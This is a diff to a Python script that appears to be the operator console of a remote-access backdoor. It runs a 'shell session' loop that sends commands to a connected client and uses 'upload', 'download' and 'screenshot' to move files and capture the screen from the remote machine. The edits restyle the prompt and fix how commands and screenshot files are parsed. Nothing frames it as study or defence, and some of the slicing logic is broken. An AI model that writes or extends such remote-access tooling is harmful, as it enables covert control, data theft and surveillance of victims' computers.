@@ -55,7 +55,7 @@ count = 0
 
 # shell session
 while True:
-    comm = input(f'\n{addr[0]}*shell: ')
+    comm = input(f'\n\033[1m*shell*\033[m ~ {addr[0]}:{addr[1]} >> ')
     if comm == 'close':
         break
     elif comm == '':
@@ -64,9 +64,9 @@ while True:
         os.system('clear')
     elif comm [:3] == 'cd ':
         pass
-    elif comm == 'upload':
+    elif comm [:6] == 'upload':
         upload_file(comm[:7])
-    elif comm == 'download':
+    elif comm [:8] == 'download':
         download_file(comm[:9])
     elif comm == 'help':
         print('''\n
@@ -77,12 +77,11 @@ while True:
         clear: clear terminal.
         \n
         ''')
-    elif comm == 'screenshot':
-        f = open('screenshot' % (count), 'wb')
+    elif comm [:10] == 'screenshot':
+        #f = open('screenshot' % (count), 'wb')
+        f = open(f'screenshot{count}', 'wb')
         client.settimeout(5)
-        f = open(file, 'wb')
-        target.settimeout(5)
-        chunkk = client.recv(1024)
+        chunk = client.recv(1024)
         while chunk:
             f.write(chunk)
             try:
